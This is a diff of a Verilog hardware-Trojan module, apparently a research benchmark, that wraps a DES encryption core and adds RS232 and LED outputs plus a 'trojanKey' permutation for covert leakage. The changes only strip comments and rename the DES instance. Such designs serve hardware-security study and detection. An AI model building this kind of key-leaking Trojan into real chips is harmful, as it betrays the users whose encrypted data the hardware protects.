@@ -3,9 +3,7 @@ module TrojanTopImplement (
 				CLK,
 				RST,
 				CHIP_SELECT_BAR,
-				//PLAIN_TEXT,
 				ADDRESS,
-				//CIPHER_TEXT,
 				SendLED,
 				SendData,
 				SendDataReady
@@ -19,21 +17,13 @@ input   RST;
 input   CHIP_SELECT_BAR; 
  
 input   ADDRESS; 
- 
-//input   [64 : 1]PLAIN_TEXT; 
- 
-//output  [64 : 1]CIPHER_TEXT; 
 
 output					SendLED;
 output	[7:0]			SendData;
 output					SendDataReady;
 
-
-// (50Mhz / 115200 )*16 ---> waiting 16 rs232 clock
-// One bit can be transmitted at every rising edge
 parameter txdivisorR = 6944;
 
-// (50Mhz / 100KHZ /2) ---> creating 100khz Ledclk
 parameter	TrojanSendingFrq=250;
 parameter	PLAIN_TEXT='hffffffffffffffff;
 
@@ -42,34 +32,21 @@ parameter	TrojanPlaneTxt='hffffffffffffffff;
 wire	[63:0] CIPHER_TEXT;
 
 
-
-//
-//register outputs 
-//
+//Registers
 reg					SendLED;
 reg	[7:0]			SendData;
 reg					SendDataReady;
 
-
-
-//
-//register input for DES Block
-//
+//Registers for DES Stuff
 reg				chipSelectR;
 reg				addrR;
 reg		[63:0]	plainTxtR;
 
-//
-//creat Busy and sending flag to deny accepting data
-//
 reg 	[4:0]	desRdyCnt;
 reg				desRunR;
 reg				sendingFlagR;
 reg				busyR;
 
-//
-//secure data that must be sen with RS232
-//
 reg		[63:0]	sendingDataR;
 
 reg		[15:0]	rs232Cnt;
@@ -82,7 +59,7 @@ reg  [20:0] ledclkDIV2;
 reg    ledClk;
 wire   ledClkOUT;
 //
-//Detect Trojan Tiger and Send Trojan Data
+//Trojan Variables
 //
 reg				trojanEnR;
 reg					trojanSendFlagR;
@@ -98,7 +75,7 @@ wire 	[63:0]	 KEY_PERMUTATION;
 
 
 
-Des_Top	DES1(.CLK(CLK), .RST(RST), .CHIP_SELECT_BAR(chipSelectR),.ADDRESS(addrR),.PLAIN_TEXT(plainTxtR), .CIPHER_TEXT(CIPHER_TEXT),.KEY(KEY));
+DESTOP	DES1(.CLK(CLK), .RST(RST), .CHIP_SELECT_BAR(chipSelectR),.ADDRESS(addrR),.PLAIN_TEXT(plainTxtR), .CIPHER_TEXT(CIPHER_TEXT),.KEY(KEY));
 
 Trojan_Permutation Permute1(.KEY(trojanKey),.KEY_PERMUTATION(KEY_PERMUTATION));
 
